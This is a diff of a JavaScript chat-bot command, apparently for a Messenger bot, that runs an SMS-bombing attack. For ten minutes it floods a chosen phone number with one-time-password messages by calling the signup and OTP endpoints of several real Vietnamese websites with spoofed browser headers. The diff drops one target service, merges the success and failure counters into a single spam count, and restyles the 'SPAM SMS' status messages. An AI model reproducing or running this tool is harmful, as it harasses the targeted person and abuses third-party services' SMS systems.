@@ -960,41 +960,14 @@ const payload = {
     const batdongsanData = {
       'phoneNumber': phone,
     };
-
-    const ahamoveHeaders = {
-    'Host': 'api.ahamove.com',
-    'content-length': '114',
-    'sec-ch-ua': '\'Chromium\';v=\'110\', \'Not A(Brand\';v=\'24\', \'Google Chrome\';v=\'110\'',
-    'accept': 'application/json, text/plain, */*',
-    'content-type': 'application/json;charset=UTF-8',
-    'sec-ch-ua-mobile': '?1',
-    'user-agent': 'Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534',
-    'sec-ch-ua-platform': '\'Android\'',
-    'origin': 'https://app.ahamove.com',
-    'sec-fetch-site': 'same-site',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-dest': 'empty',
-    'referer': 'https://app.ahamove.com/',
-    'accept-encoding': 'gzip, deflate, br',
-    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4', 
-};
-
-    const ahamoveData = {
-      'mobile': phone.substring(1, 11),
-    'name': 'Tuấn',
-    'email': 'cocailondjtcmm12@gmail.com',
-    'country_code': 'VN',
-    'firebase_sms_auth': 'true', 
-};
       
 
     // Initial message to be edited later
     let messageID = null;
-    let successCount = 0;
-    let failureCount = 0;
+    let totalCount = 0;
 
     // Send initial message showing spam details
-    const initialMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
+    const initialMessage = `🔥 SPAM SMS 🔥\n🔗 Số: ${phone}\n⏰ Thời gian spam: 10 phút`;
     api.sendMessage(initialMessage, event.threadID, (error, messageInfo) => {
       if (!error) {
         messageID = messageInfo.messageID;
@@ -1077,21 +1050,16 @@ const payload = {
         axios.post('https://nhadat.cafeland.vn/member-send-otp/', nhadatData, { headers: nhadatHeaders }),
         axios.post('https://www.nhaphang247.com/site/get-code', nhaphangData, { headers: nhaphangHeaders, cookies: nhaphangCookies }),
         axios.post('https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', batdongsanData, { headers: batdongsanHeaders, cookies: batdongsanCookies }), 
-        axios.post('https://api.ahamove.com/api/v3/public/user/register', ahamoveData, { headers: ahamoveHeaders }), 
         ])
-      .then(() => {
-        successCount += 32;
-        updateMessage();
-      })
       .catch(() => {
-        failureCount += 32;
+        totalCount += 36;
         updateMessage();
       });
     };
 
     // Function to update the message with success and failure count
     const updateMessage = () => {
-      const updatedMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
+      const updatedMessage = `🔥 SPAM SMS 🔥\n🔗 Số: ${phone}\n⏰ Thời gian spam: 10 phút\n📌 Số lần spam : ${totalCount}`;
       if (messageID) {
         api.editMessage(updatedMessage, event.threadID, messageID);
       }
